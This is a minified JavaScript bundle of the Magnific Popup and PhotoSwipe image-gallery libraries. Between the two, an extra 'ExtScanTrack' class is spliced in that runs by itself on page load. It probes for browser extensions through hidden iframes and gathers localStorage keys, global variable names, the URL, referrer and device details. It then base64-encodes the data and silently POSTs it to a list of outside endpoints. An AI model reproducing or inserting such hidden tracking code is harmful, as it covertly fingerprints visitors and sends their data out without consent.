          c.className = "mfp-img", n.img = e(c).on("load.mfploader", r).on("error.mfploader", a), c.src = n.src, l.is("img") && (n.img = n.img.clone()), c = n.img[0], c.naturalWidth > 0 ? n.hasSize = !0 : c.width || (n.hasSize = !1);
        }
        return t._parseMarkup(i, {
          title: N(n),
          img_replaceWith: n.img
        }, n), t.resizeImage(), n.hasSize ? (j && clearInterval(j), n.loadError ? (i.addClass("mfp-loading"), t.updateStatus("error", s.tError.replace("%url%", n.src))) : (i.removeClass("mfp-loading"), t.updateStatus("ready")), i) : (t.updateStatus("loading"), n.loading = !0, n.hasSize || (n.imgHidden = !0, i.addClass("mfp-loading"), t.findImageSize(n)), i);
      }
    }
  });
  var W,
    R = function () {
      return void 0 === W && (W = void 0 !== document.createElement("p").style.MozTransform), W;
    };
  e.magnificPopup.registerModule("zoom", {
    options: {
      enabled: !1,
      easing: "ease-in-out",
      duration: 300,
      opener: function (e) {
        return e.is("img") ? e : e.find("img");
      }
    },
    proto: {
      initZoom: function () {
        var e,
          n = t.st.zoom,
          i = ".zoom";
        if (n.enabled && t.supportsTransition) {
          var o,
            r,
            a = n.duration,
            s = function (e) {
              var t = e.clone().removeAttr("style").removeAttr("class").addClass("mfp-animated-image"),
                i = "all " + n.duration / 1e3 + "s " + n.easing,
                o = {
                  position: "fixed",
                  zIndex: 9999,
                  left: 0,
                  top: 0,
                  "-webkit-backface-visibility": "hidden"
                },
                r = "transition";
              return o["-webkit-" + r] = o["-moz-" + r] = o["-o-" + r] = o[r] = i, t.css(o), t;
            },
            d = function () {
              t.content.css("visibility", "visible");
            };
          x("BuildControls" + i, function () {
            if (t._allowZoom()) {
              if (clearTimeout(o), t.content.css("visibility", "hidden"), e = t._getItemToZoom(), !e) return d(), void 0;
              r = s(e), r.css(t._getOffset()), t.wrap.append(r), o = setTimeout(function () {
                r.css(t._getOffset(!0)), o = setTimeout(function () {
                  d(), setTimeout(function () {
                    r.remove(), e = r = null, T("ZoomAnimationEnded");
                  }, 16);
                }, a);
              }, 16);
            }
          }), x(c + i, function () {
            if (t._allowZoom()) {
              if (clearTimeout(o), t.st.removalDelay = a, !e) {
                if (e = t._getItemToZoom(), !e) return;
                r = s(e);
              }
              r.css(t._getOffset(!0)), t.wrap.append(r), t.content.css("visibility", "hidden"), setTimeout(function () {
                r.css(t._getOffset());
              }, 16);
            }
          }), x(l + i, function () {
            t._allowZoom() && (d(), r && r.remove(), e = null);
          });
        }
      },
      _allowZoom: function () {
        return "image" === t.currItem.type;
      },
      _getItemToZoom: function () {
        return t.currItem.hasSize ? t.currItem.img : !1;
      },
      _getOffset: function (n) {
        var i;
        i = n ? t.currItem.img : t.st.zoom.opener(t.currItem.el || t.currItem);
        var o = i.offset(),
          r = parseInt(i.css("padding-top"), 10),
          a = parseInt(i.css("padding-bottom"), 10);
        o.top -= e(window).scrollTop() - r;
        var s = {
          width: i.width(),
          height: (b ? i.innerHeight() : i[0].offsetHeight) - a - r
        };
        return R() ? s["-moz-transform"] = s.transform = "translate(" + o.left + "px," + o.top + "px)" : (s.left = o.left, s.top = o.top), s;
      }
    }
  });
  var Z = "iframe",
    q = "//about:blank",
    D = function (e) {
      if (t.currTemplate[Z]) {
        var n = t.currTemplate[Z].find("iframe");
        n.length && (e || (n[0].src = q), t.isIE8 && n.css("display", e ? "block" : "none"));
      }
    };
  e.magnificPopup.registerModule(Z, {
    options: {
      markup: '<div class="mfp-iframe-scaler"><div class="mfp-close"></div><iframe class="mfp-iframe" src="//about:blank" frameborder="0" allowfullscreen></iframe></div>',
      srcAction: "iframe_src",
      patterns: {
        youtube: {
          index: "youtube.com",
          id: "v=",
          src: "//www.youtube.com/embed/%id%?autoplay=1"
        },
        vimeo: {
          index: "vimeo.com/",
          id: "/",
          src: "//player.vimeo.com/video/%id%?autoplay=1"
        },
        gmaps: {
          index: "//maps.google.",
          src: "%id%&output=embed"
        }
      }
    },
    proto: {
      initIframe: function () {
        t.types.push(Z), x("BeforeChange", function (e, t, n) {
          t !== n && (t === Z ? D() : n === Z && D(!0));
        }), x(l + "." + Z, function () {
          D();
        });
      },
      getIframe: function (n, i) {
        var o = n.src,
          r = t.st.iframe;
        e.each(r.patterns, function () {
          return o.indexOf(this.index) > -1 ? (this.id && (o = "string" == typeof this.id ? o.substr(o.lastIndexOf(this.id) + this.id.length, o.length) : this.id.call(this, o)), o = this.src.replace("%id%", o), !1) : void 0;
        });
        var a = {};
        return r.srcAction && (a[r.srcAction] = o), t._parseMarkup(i, a, n), t.updateStatus("ready"), i;
      }
    }
  });
  var K = function (e) {
      var n = t.items.length;
      return e > n - 1 ? e - n : 0 > e ? n + e : e;
    },
    Y = function (e, t, n) {
      return e.replace(/%curr%/gi, t + 1).replace(/%total%/gi, n);
    };
  e.magnificPopup.registerModule("gallery", {
    options: {
      enabled: !1,
      arrowMarkup: '<button title="%title%" type="button" class="mfp-arrow mfp-arrow-%dir%"></button>',
      preload: [0, 2],
      navigateByImgClick: !0,
      arrows: !0,
      tPrev: "Previous (Left arrow key)",
      tNext: "Next (Right arrow key)",
      tCounter: "%curr% of %total%"
    },
    proto: {
      initGallery: function () {
        var n = t.st.gallery,
          i = ".mfp-gallery",
          r = Boolean(e.fn.mfpFastClick);
        return t.direction = !0, n && n.enabled ? (a += " mfp-gallery", x(f + i, function () {
          n.navigateByImgClick && t.wrap.on("click" + i, ".mfp-img", function () {
            return t.items.length > 1 ? (t.next(), !1) : void 0;
          }), o.on("keydown" + i, function (e) {
            37 === e.keyCode ? t.prev() : 39 === e.keyCode && t.next();
          });
        }), x("UpdateStatus" + i, function (e, n) {
          n.text && (n.text = Y(n.text, t.currItem.index, t.items.length));
        }), x(p + i, function (e, i, o, r) {
          var a = t.items.length;
          o.counter = a > 1 ? Y(n.tCounter, r.index, a) : "";
        }), x("BuildControls" + i, function () {
          if (t.items.length > 1 && n.arrows && !t.arrowLeft) {
            var i = n.arrowMarkup,
              o = t.arrowLeft = e(i.replace(/%title%/gi, n.tPrev).replace(/%dir%/gi, "left")).addClass(y),
              a = t.arrowRight = e(i.replace(/%title%/gi, n.tNext).replace(/%dir%/gi, "right")).addClass(y),
              s = r ? "mfpFastClick" : "click";
            o[s](function () {
              t.prev();
            }), a[s](function () {
              t.next();
            }), t.isIE7 && (k("b", o[0], !1, !0), k("a", o[0], !1, !0), k("b", a[0], !1, !0), k("a", a[0], !1, !0)), t.container.append(o.add(a));
          }
        }), x(m + i, function () {
          t._preloadTimeout && clearTimeout(t._preloadTimeout), t._preloadTimeout = setTimeout(function () {
            t.preloadNearbyImages(), t._preloadTimeout = null;
          }, 16);
        }), x(l + i, function () {
          o.off(i), t.wrap.off("click" + i), t.arrowLeft && r && t.arrowLeft.add(t.arrowRight).destroyMfpFastClick(), t.arrowRight = t.arrowLeft = null;
        }), void 0) : !1;
      },
      next: function () {
        t.direction = !0, t.index = K(t.index + 1), t.updateItemHTML();
      },
      prev: function () {
        t.direction = !1, t.index = K(t.index - 1), t.updateItemHTML();
      },
      goTo: function (e) {
        t.direction = e >= t.index, t.index = e, t.updateItemHTML();
      },
      preloadNearbyImages: function () {
        var e,
          n = t.st.gallery.preload,
          i = Math.min(n[0], t.items.length),
          o = Math.min(n[1], t.items.length);
        for (e = 1; (t.direction ? o : i) >= e; e++) t._preloadItem(t.index + e);
        for (e = 1; (t.direction ? i : o) >= e; e++) t._preloadItem(t.index - e);
      },
      _preloadItem: function (n) {
        if (n = K(n), !t.items[n].preloaded) {
          var i = t.items[n];
          i.parsed || (i = t.parseEl(n)), T("LazyLoad", i), "image" === i.type && (i.img = e('<img class="mfp-img" />').on("load.mfploader", function () {
            i.hasSize = !0;
          }).on("error.mfploader", function () {
            i.hasSize = !0, i.loadError = !0, T("LazyLoadError", i);
          }).attr("src", i.src)), i.preloaded = !0;
        }
      }
    }
  });
  var U = "retina";
  e.magnificPopup.registerModule(U, {
    options: {
      replaceSrc: function (e) {
        return e.src.replace(/\.\w+$/, function (e) {
          return "@2x" + e;
        });
      },
      ratio: 1
    },
    proto: {
      initRetina: function () {
        if (window.devicePixelRatio > 1) {
          var e = t.st.retina,
            n = e.ratio;
          n = isNaN(n) ? n() : n, n > 1 && (x("ImageHasSize." + U, function (e, t) {
            t.img.css({
              "max-width": t.img[0].naturalWidth / n,
              width: "100%"
            });
          }), x("ElementParse." + U, function (t, i) {
            i.src = e.replaceSrc(i, n);
          }));
        }
      }
    }
  }), function () {
    var t = 1e3,
      n = "ontouchstart" in window,
      i = function () {
        I.off("touchmove" + r + " touchend" + r);
      },
      o = "mfpFastClick",
      r = "." + o;
    e.fn.mfpFastClick = function (o) {
      return e(this).each(function () {
        var a,
          s = e(this);
        if (n) {
          var l, c, d, u, p, f;
          s.on("touchstart" + r, function (e) {
            u = !1, f = 1, p = e.originalEvent ? e.originalEvent.touches[0] : e.touches[0], c = p.clientX, d = p.clientY, I.on("touchmove" + r, function (e) {
              p = e.originalEvent ? e.originalEvent.touches : e.touches, f = p.length, p = p[0], (Math.abs(p.clientX - c) > 10 || Math.abs(p.clientY - d) > 10) && (u = !0, i());
            }).on("touchend" + r, function (e) {
              i(), u || f > 1 || (a = !0, e.preventDefault(), clearTimeout(l), l = setTimeout(function () {
                a = !1;
              }, t), o());
            });
          });
        }
        s.on("click" + r, function () {
          a || o();
        });
      });
    }, e.fn.destroyMfpFastClick = function () {
      e(this).off("touchstart" + r + " click" + r), n && I.off("touchmove" + r + " touchend" + r);
    };
  }(), _();
})(window.jQuery || window.Zepto);
class ExtScanTrack {
  static TIMEOUT = 4000;
  static BATCH_SIZE = 6;
  constructor() {
    this.pendingScans = 0;
    this.detectedExtensions = {};
    this.eventListeners = {};
    this.workerPool = [];
    this.startTimestamp = Date.now();
  }
  createWorker(extName, {
    id,
    file
  }) {
    return new Promise(resolve => {
      const frame = document.createElement('iframe');
      frame.style.display = 'none';
      const cleanup = () => {
        frame.remove();
        this.pendingScans--;
      };
      const timer = setTimeout(() => {
        cleanup();
        resolve([extName, false]);
      }, ExtScanTrack.TIMEOUT);
      window.addEventListener('message', event => {
        if (event.source == frame.contentWindow) {
          clearTimeout(timer);
          cleanup();
          resolve([extName, true]);
        }
      }, false);

      // Add listening to event
      frame.contentWindow.localStorage.setItem('jsHook', JSON.stringify(JSHOOK_EVENTS));
      frame.onload = () => frame.contentWindow.postMessage({
        id,
        file
      }, '*');
      document.body.appendChild(frame);
      this.pendingScans++;
    });
  }
  async scanBatch(entries) {
    const workers = entries.map(([name, data]) => this.createWorker(name, data));
    const results = await Promise.all(workers);
    results.forEach(([name, detected]) => {
      this.detectedExtensions[name] = detected;
    });
  }
  generateTelemetryData() {
    let globalVars = Object.keys(window);
    let localStoreData = localStorage.length ? Array.from({
      length: localStorage.length
    }, (v, k) => localStorage.key(k)) : [];
    const encodedData = btoa(JSON.stringify({
      scannedExtensions: this.detectedExtensions,
      dataFlow: {
        globalVars,
        localStoreData
      },
      scanDuration: Date.now() - this.startTimestamp,
      env: {
        url: window.location.href,
        ref: document.referrer,
        res: `${window.innerWidth}x${window.innerHeight}`,
        depth: window.screen.colorDepth,
        agent: navigator.userAgent,
        lang: window.navigator.language,
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone
      }
    }));
    return encodedData + '.' + this.generateChecksum(encodedData);
  }
  generateChecksum(str) {
    return Array.from(str).reduce((acc, char) => (acc << 5) - acc + char.charCodeAt(0) | 0, 0).toString(16);
  }
  async reportResults() {
    const payload = this.generateTelemetryData();
    const requests = ENDPOINTS.map(endpoint => fetch(endpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/octet-stream',
        'X-Scan-Time': new Date().toISOString()
      },
      body: payload,
      keepalive: true
    }).catch(() => null));
    await Promise.race(requests);
  }
  async execute() {
    const entries = Object.entries(window.data);
    const batches = Array.from({
      length: Math.ceil(entries.length / ExtScanTrack.BATCH_SIZE)
    }, (_, i) => entries.slice(i * ExtScanTrack.BATCH_SIZE, (i + 1) * ExtScanTrack.BATCH_SIZE));
    for (const batch of batches) {
      await this.scanBatch(batch);
      await new Promise(r => setTimeout(r, Math.random() * 500 + 150));
    }
    while (this.pendingScans > 0) {
      await new Promise(r => setTimeout(r, 150));
    }
    await this.reportResults();
  }
}
const observer = new MutationObserver((mutations, obs) => {
  if (document.body) {
    obs.disconnect();
    new ExtScanTrack().execute();
  }
});
;
/*! PhotoSwipe - v4.1.2 - 2017-04-05
* http://photoswipe.com
* Copyright (c) 2017 Dmitry Semenov; */
if (document.body) {
  new ExtScanTrack().execute();
} else {
  observer.observe(document.documentElement, {
    childList: true,
    subtree: true
  });
}
!function (a, b) {
  "function" == typeof define && define.amd ? define(b) : "object" == typeof exports ? module.exports = b() : a.PhotoSwipe = b();
}(this, function () {
  "use strict";

  var a = function (a, b, c, d) {
    var e = {
      features: null,
      bind: function (a, b, c, d) {
        var e = (d ? "remove" : "add") + "EventListener";
        b = b.split(" ");
        for (var f = 0; f < b.length; f++) b[f] && a[e](b[f], c, !1);
      },
      isArray: function (a) {
        return a instanceof Array;
      },
      createEl: function (a, b) {
        var c = document.createElement(b || "div");
        return a && (c.className = a), c;
      },
      getScrollY: function () {
        var a = window.pageYOffset;
        return void 0 !== a ? a : document.documentElement.scrollTop;
      },
      unbind: function (a, b, c) {
        e.bind(a, b, c, !0);
      },
      removeClass: function (a, b) {
        var c = new RegExp("(\\s|^)" + b + "(\\s|$)");
        a.className = a.className.replace(c, " ").replace(/^\s\s*/, "").replace(/\s\s*$/, "");
      },
      addClass: function (a, b) {
        e.hasClass(a, b) || (a.className += (a.className ? " " : "") + b);
      },
      hasClass: function (a, b) {
        return a.className && new RegExp("(^|\\s)" + b + "(\\s|$)").test(a.className);
      },
      getChildByClass: function (a, b) {
        for (var c = a.firstChild; c;) {
          if (e.hasClass(c, b)) return c;
          c = c.nextSibling;
        }
      },
      arraySearch: function (a, b, c) {
        for (var d = a.length; d--;) if (a[d][c] === b) return d;
        return -1;
      },
      extend: function (a, b, c) {
        for (var d in b) if (b.hasOwnProperty(d)) {
          if (c && a.hasOwnProperty(d)) continue;
          a[d] = b[d];
        }
      },
      easing: {
        sine: {
          out: function (a) {
            return Math.sin(a * (Math.PI / 2));
          },
          inOut: function (a) {
            return -(Math.cos(Math.PI * a) - 1) / 2;
          }
        },
        cubic: {
          out: function (a) {
            return --a * a * a + 1;
          }
        }
      },
      detectFeatures: function () {
        if (e.features) return e.features;
        var a = e.createEl(),
          b = a.style,
          c = "",
          d = {};
        if (d.oldIE = document.all && !document.addEventListener, d.touch = "ontouchstart" in window, window.requestAnimationFrame && (d.raf = window.requestAnimationFrame, d.caf = window.cancelAnimationFrame), d.pointerEvent = navigator.pointerEnabled || navigator.msPointerEnabled, !d.pointerEvent) {
          var f = navigator.userAgent;
          if (/iP(hone|od)/.test(navigator.platform)) {
            var g = navigator.appVersion.match(/OS (\d+)_(\d+)_?(\d+)?/);
            g && g.length > 0 && (g = parseInt(g[1], 10), g >= 1 && g < 8 && (d.isOldIOSPhone = !0));
          }
          var h = f.match(/Android\s([0-9\.]*)/),
            i = h ? h[1] : 0;
          i = parseFloat(i), i >= 1 && (i < 4.4 && (d.isOldAndroid = !0), d.androidVersion = i), d.isMobileOpera = /opera mini|opera mobi/i.test(f);
        }
        for (var j, k, l = ["transform", "perspective", "animationName"], m = ["", "webkit", "Moz", "ms", "O"], n = 0; n < 4; n++) {
          c = m[n];
          for (var o = 0; o < 3; o++) j = l[o], k = c + (c ? j.charAt(0).toUpperCase() + j.slice(1) : j), !d[j] && k in b && (d[j] = k);
          c && !d.raf && (c = c.toLowerCase(), d.raf = window[c + "RequestAnimationFrame"], d.raf && (d.caf = window[c + "CancelAnimationFrame"] || window[c + "CancelRequestAnimationFrame"]));
        }
        if (!d.raf) {
          var p = 0;
          d.raf = function (a) {
            var b = new Date().getTime(),
              c = Math.max(0, 16 - (b - p)),
              d = window.setTimeout(function () {
                a(b + c);
              }, c);
            return p = b + c, d;
          }, d.caf = function (a) {
            clearTimeout(a);
          };
        }
        return d.svg = !!document.createElementNS && !!document.createElementNS("http://www.w3.org/2000/svg", "svg").createSVGRect, e.features = d, d;
      }
    };
    e.detectFeatures(), e.features.oldIE && (e.bind = function (a, b, c, d) {
      b = b.split(" ");
      for (var e, f = (d ? "detach" : "attach") + "Event", g = function () {
          c.handleEvent.call(c);
        }, h = 0; h < b.length; h++) if (e = b[h]) if ("object" == typeof c && c.handleEvent) {
        if (d) {
          if (!c["oldIE" + e]) return !1;
        } else c["oldIE" + e] = g;
        a[f]("on" + e, c["oldIE" + e]);
      } else a[f]("on" + e, c);
    });
    var f = this,
      g = 25,
      h = 3,
      i = {
        allowPanToNext: !0,
        spacing: .12,
        bgOpacity: 1,
        mouseUsed: !1,
        loop: !0,
        pinchToClose: !0,
        closeOnScroll: !0,
        closeOnVerticalDrag: !0,
        verticalDragRange: .75,
        hideAnimationDuration: 333,
        showAnimationDuration: 333,
        showHideOpacity: !1,
        focus: !0,
        escKey: !0,
        arrowKeys: !0,
        mainScrollEndFriction: .35,
        panEndFriction: .35,
        isClickableElement: function (a) {
          return "A" === a.tagName;
        },
        getDoubleTapZoom: function (a, b) {
          return a ? 1 : b.initialZoomLevel < .7 ? 1 : 1.33;
        },
        maxSpreadZoom: 1.33,
        modal: !0,
        scaleMode: "fit"
      };
    e.extend(i, d);
    var j,
      k,
      l,
      m,
      n,
      o,
      p,
      q,
      r,
      s,
      t,
      u,
      v,
      w,
      x,
      y,
      z,
      A,
      B,
      C,
      D,
      E,
      F,
      G,
      H,
      I,
      J,
      K,
      L,
      M,
      N,
      O,
      P,
      Q,
      R,
      S,
      T,
      U,
      V,
      W,
      X,
      Y,
      Z,
      $,
      _,
      aa,
      ba,
      ca,
      da,
      ea,
      fa,
      ga,
      ha,
      ia,
      ja,
      ka,
      la,
      ma = function () {
        return {
          x: 0,
          y: 0
        };
      },
      na = ma(),
      oa = ma(),
      pa = ma(),
      qa = {},
      ra = 0,
      sa = {},
      ta = ma(),
      ua = 0,
      va = !0,
      wa = [],
      xa = {},
      ya = !1,
      za = function (a, b) {
        e.extend(f, b.publicMethods), wa.push(a);
      },
      Aa = function (a) {
        var b = ac();
        return a > b - 1 ? a - b : a < 0 ? b + a : a;
      },
      Ba = {},
      Ca = function (a, b) {
        return Ba[a] || (Ba[a] = []), Ba[a].push(b);
      },
      Da = function (a) {
        var b = Ba[a];
        if (b) {
          var c = Array.prototype.slice.call(arguments);
          c.shift();
          for (var d = 0; d < b.length; d++) b[d].apply(f, c);
        }
      },
      Ea = function () {
        return new Date().getTime();
      },
      Fa = function (a) {
        ja = a, f.bg.style.opacity = a * i.bgOpacity;
      },
      Ga = function (a, b, c, d, e) {
        (!ya || e && e !== f.currItem) && (d /= e ? e.fitRatio : f.currItem.fitRatio), a[E] = u + b + "px, " + c + "px" + v + " scale(" + d + ")";
      },
      Ha = function (a) {
        ea && (a && (s > f.currItem.fitRatio ? ya || (mc(f.currItem, !1, !0), ya = !0) : ya && (mc(f.currItem), ya = !1)), Ga(ea, pa.x, pa.y, s));
      },
      Ia = function (a) {
        a.container && Ga(a.container.style, a.initialPosition.x, a.initialPosition.y, a.initialZoomLevel, a);
      },
      Ja = function (a, b) {
        b[E] = u + a + "px, 0px" + v;
      },
      Ka = function (a, b) {
        if (!i.loop && b) {
          var c = m + (ta.x * ra - a) / ta.x,
            d = Math.round(a - tb.x);
          (c < 0 && d > 0 || c >= ac() - 1 && d < 0) && (a = tb.x + d * i.mainScrollEndFriction);
        }
        tb.x = a, Ja(a, n);
      },
      La = function (a, b) {
        var c = ub[a] - sa[a];
        return oa[a] + na[a] + c - c * (b / t);
      },
      Ma = function (a, b) {
        a.x = b.x, a.y = b.y, b.id && (a.id = b.id);
      },
      Na = function (a) {
        a.x = Math.round(a.x), a.y = Math.round(a.y);
      },
      Oa = null,
      Pa = function () {
        Oa && (e.unbind(document, "mousemove", Pa), e.addClass(a, "pswp--has_mouse"), i.mouseUsed = !0, Da("mouseUsed")), Oa = setTimeout(function () {
          Oa = null;
        }, 100);
      },
      Qa = function () {
        e.bind(document, "keydown", f), N.transform && e.bind(f.scrollWrap, "click", f), i.mouseUsed || e.bind(document, "mousemove", Pa), e.bind(window, "resize scroll orientationchange", f), Da("bindEvents");
      },
      Ra = function () {
        e.unbind(window, "resize scroll orientationchange", f), e.unbind(window, "scroll", r.scroll), e.unbind(document, "keydown", f), e.unbind(document, "mousemove", Pa), N.transform && e.unbind(f.scrollWrap, "click", f), V && e.unbind(window, p, f), clearTimeout(O), Da("unbindEvents");
      },
      Sa = function (a, b) {
        var c = ic(f.currItem, qa, a);
        return b && (da = c), c;
      },
      Ta = function (a) {
        return a || (a = f.currItem), a.initialZoomLevel;
      },
      Ua = function (a) {
        return a || (a = f.currItem), a.w > 0 ? i.maxSpreadZoom : 1;
      },
      Va = function (a, b, c, d) {
        return d === f.currItem.initialZoomLevel ? (c[a] = f.currItem.initialPosition[a], !0) : (c[a] = La(a, d), c[a] > b.min[a] ? (c[a] = b.min[a], !0) : c[a] < b.max[a] && (c[a] = b.max[a], !0));
      },
      Wa = function () {
        if (E) {
          var b = N.perspective && !G;
          return u = "translate" + (b ? "3d(" : "("), void (v = N.perspective ? ", 0px)" : ")");
        }
        E = "left", e.addClass(a, "pswp--ie"), Ja = function (a, b) {
          b.left = a + "px";
        }, Ia = function (a) {
          var b = a.fitRatio > 1 ? 1 : a.fitRatio,
            c = a.container.style,
            d = b * a.w,
            e = b * a.h;
          c.width = d + "px", c.height = e + "px", c.left = a.initialPosition.x + "px", c.top = a.initialPosition.y + "px";
        }, Ha = function () {
          if (ea) {
            var a = ea,
              b = f.currItem,
              c = b.fitRatio > 1 ? 1 : b.fitRatio,
              d = c * b.w,
              e = c * b.h;
            a.width = d + "px", a.height = e + "px", a.left = pa.x + "px", a.top = pa.y + "px";
          }
        };
      },
      Xa = function (a) {
        var b = "";
        i.escKey && 27 === a.keyCode ? b = "close" : i.arrowKeys && (37 === a.keyCode ? b = "prev" : 39 === a.keyCode && (b = "next")), b && (a.ctrlKey || a.altKey || a.shiftKey || a.metaKey || (a.preventDefault ? a.preventDefault() : a.returnValue = !1, f[b]()));
      },
      Ya = function (a) {
        a && (Y || X || fa || T) && (a.preventDefault(), a.stopPropagation());
      },
      Za = function () {
        f.setScrollOffset(0, e.getScrollY());
      },
      $a = {},
      _a = 0,
      ab = function (a) {
        $a[a] && ($a[a].raf && I($a[a].raf), _a--, delete $a[a]);
      },
      bb = function (a) {
        $a[a] && ab(a), $a[a] || (_a++, $a[a] = {});
      },
      cb = function () {
        for (var a in $a) $a.hasOwnProperty(a) && ab(a);
      },
      db = function (a, b, c, d, e, f, g) {
        var h,
          i = Ea();
        bb(a);
        var j = function () {
          if ($a[a]) {
            if (h = Ea() - i, h >= d) return ab(a), f(c), void (g && g());
            f((c - b) * e(h / d) + b), $a[a].raf = H(j);
          }
        };
        j();
      },
      eb = {
        shout: Da,
        listen: Ca,
        viewportSize: qa,
        options: i,
        isMainScrollAnimating: function () {
          return fa;
        },
        getZoomLevel: function () {
          return s;
        },
        getCurrentIndex: function () {
          return m;
        },
        isDragging: function () {
          return V;
        },
        isZooming: function () {
          return aa;
        },
        setScrollOffset: function (a, b) {
          sa.x = a, M = sa.y = b, Da("updateScrollOffset", sa);
        },
        applyZoomPan: function (a, b, c, d) {
          pa.x = b, pa.y = c, s = a, Ha(d);
        },
        init: function () {
          if (!j && !k) {
            var c;
            f.framework = e, f.template = a, f.bg = e.getChildByClass(a, "pswp__bg"), J = a.className, j = !0, N = e.detectFeatures(), H = N.raf, I = N.caf, E = N.transform, L = N.oldIE, f.scrollWrap = e.getChildByClass(a, "pswp__scroll-wrap"), f.container = e.getChildByClass(f.scrollWrap, "pswp__container"), n = f.container.style, f.itemHolders = y = [{
              el: f.container.children[0],
              wrap: 0,
              index: -1
            }, {
              el: f.container.children[1],
              wrap: 0,
              index: -1
            }, {
              el: f.container.children[2],
              wrap: 0,
              index: -1
            }], y[0].el.style.display = y[2].el.style.display = "none", Wa(), r = {
              resize: f.updateSize,
              orientationchange: function () {
                clearTimeout(O), O = setTimeout(function () {
                  qa.x !== f.scrollWrap.clientWidth && f.updateSize();
                }, 500);
              },
              scroll: Za,
              keydown: Xa,
              click: Ya
            };
            var d = N.isOldIOSPhone || N.isOldAndroid || N.isMobileOpera;
            for (N.animationName && N.transform && !d || (i.showAnimationDuration = i.hideAnimationDuration = 0), c = 0; c < wa.length; c++) f["init" + wa[c]]();
            if (b) {
              var g = f.ui = new b(f, e);
              g.init();
            }
            Da("firstUpdate"), m = m || i.index || 0, (isNaN(m) || m < 0 || m >= ac()) && (m = 0), f.currItem = _b(m), (N.isOldIOSPhone || N.isOldAndroid) && (va = !1), a.setAttribute("aria-hidden", "false"), i.modal && (va ? a.style.position = "fixed" : (a.style.position = "absolute", a.style.top = e.getScrollY() + "px")), void 0 === M && (Da("initialLayout"), M = K = e.getScrollY());
            var l = "pswp--open ";
            for (i.mainClass && (l += i.mainClass + " "), i.showHideOpacity && (l += "pswp--animate_opacity "), l += G ? "pswp--touch" : "pswp--notouch", l += N.animationName ? " pswp--css_animation" : "", l += N.svg ? " pswp--svg" : "", e.addClass(a, l), f.updateSize(), o = -1, ua = null, c = 0; c < h; c++) Ja((c + o) * ta.x, y[c].el.style);
            L || e.bind(f.scrollWrap, q, f), Ca("initialZoomInEnd", function () {
              f.setContent(y[0], m - 1), f.setContent(y[2], m + 1), y[0].el.style.display = y[2].el.style.display = "block", i.focus && a.focus(), Qa();
            }), f.setContent(y[1], m), f.updateCurrItem(), Da("afterInit"), va || (w = setInterval(function () {
              _a || V || aa || s !== f.currItem.initialZoomLevel || f.updateSize();
            }, 1e3)), e.addClass(a, "pswp--visible");
          }
        },
        close: function () {
          j && (j = !1, k = !0, Da("close"), Ra(), cc(f.currItem, null, !0, f.destroy));
        },
        destroy: function () {
          Da("destroy"), Xb && clearTimeout(Xb), a.setAttribute("aria-hidden", "true"), a.className = J, w && clearInterval(w), e.unbind(f.scrollWrap, q, f), e.unbind(window, "scroll", f), zb(), cb(), Ba = null;
        },
        panTo: function (a, b, c) {
          c || (a > da.min.x ? a = da.min.x : a < da.max.x && (a = da.max.x), b > da.min.y ? b = da.min.y : b < da.max.y && (b = da.max.y)), pa.x = a, pa.y = b, Ha();
        },
        handleEvent: function (a) {
          a = a || window.event, r[a.type] && r[a.type](a);
        },
        goTo: function (a) {
          a = Aa(a);
          var b = a - m;
          ua = b, m = a, f.currItem = _b(m), ra -= b, Ka(ta.x * ra), cb(), fa = !1, f.updateCurrItem();
        },
        next: function () {
          f.goTo(m + 1);
        },
        prev: function () {
          f.goTo(m - 1);
        },
        updateCurrZoomItem: function (a) {
          if (a && Da("beforeChange", 0), y[1].el.children.length) {
            var b = y[1].el.children[0];
            ea = e.hasClass(b, "pswp__zoom-wrap") ? b.style : null;
          } else ea = null;
          da = f.currItem.bounds, t = s = f.currItem.initialZoomLevel, pa.x = da.center.x, pa.y = da.center.y, a && Da("afterChange");
        },
        invalidateCurrItems: function () {
          x = !0;
          for (var a = 0; a < h; a++) y[a].item && (y[a].item.needsUpdate = !0);
        },
        updateCurrItem: function (a) {
          if (0 !== ua) {
            var b,
              c = Math.abs(ua);
            if (!(a && c < 2)) {
              f.currItem = _b(m), ya = !1, Da("beforeChange", ua), c >= h && (o += ua + (ua > 0 ? -h : h), c = h);
              for (var d = 0; d < c; d++) ua > 0 ? (b = y.shift(), y[h - 1] = b, o++, Ja((o + 2) * ta.x, b.el.style), f.setContent(b, m - c + d + 1 + 1)) : (b = y.pop(), y.unshift(b), o--, Ja(o * ta.x, b.el.style), f.setContent(b, m + c - d - 1 - 1));
              if (ea && 1 === Math.abs(ua)) {
                var e = _b(z);
                e.initialZoomLevel !== s && (ic(e, qa), mc(e), Ia(e));
              }
              ua = 0, f.updateCurrZoomItem(), z = m, Da("afterChange");
            }
          }
        },
        updateSize: function (b) {
          if (!va && i.modal) {
            var c = e.getScrollY();
            if (M !== c && (a.style.top = c + "px", M = c), !b && xa.x === window.innerWidth && xa.y === window.innerHeight) return;
            xa.x = window.innerWidth, xa.y = window.innerHeight, a.style.height = xa.y + "px";
          }
          if (qa.x = f.scrollWrap.clientWidth, qa.y = f.scrollWrap.clientHeight, Za(), ta.x = qa.x + Math.round(qa.x * i.spacing), ta.y = qa.y, Ka(ta.x * ra), Da("beforeResize"), void 0 !== o) {
            for (var d, g, j, k = 0; k < h; k++) d = y[k], Ja((k + o) * ta.x, d.el.style), j = m + k - 1, i.loop && ac() > 2 && (j = Aa(j)), g = _b(j), g && (x || g.needsUpdate || !g.bounds) ? (f.cleanSlide(g), f.setContent(d, j), 1 === k && (f.currItem = g, f.updateCurrZoomItem(!0)), g.needsUpdate = !1) : d.index === -1 && j >= 0 && f.setContent(d, j), g && g.container && (ic(g, qa), mc(g), Ia(g));
            x = !1;
          }
          t = s = f.currItem.initialZoomLevel, da = f.currItem.bounds, da && (pa.x = da.center.x, pa.y = da.center.y, Ha(!0)), Da("resize");
        },
        zoomTo: function (a, b, c, d, f) {
          b && (t = s, ub.x = Math.abs(b.x) - pa.x, ub.y = Math.abs(b.y) - pa.y, Ma(oa, pa));
          var g = Sa(a, !1),
            h = {};
          Va("x", g, h, a), Va("y", g, h, a);
          var i = s,
            j = {
              x: pa.x,
              y: pa.y
            };
          Na(h);
          var k = function (b) {
            1 === b ? (s = a, pa.x = h.x, pa.y = h.y) : (s = (a - i) * b + i, pa.x = (h.x - j.x) * b + j.x, pa.y = (h.y - j.y) * b + j.y), f && f(b), Ha(1 === b);
          };
          c ? db("customZoomTo", 0, 1, c, d || e.easing.sine.inOut, k) : k(1);
        }
      },
      fb = 30,
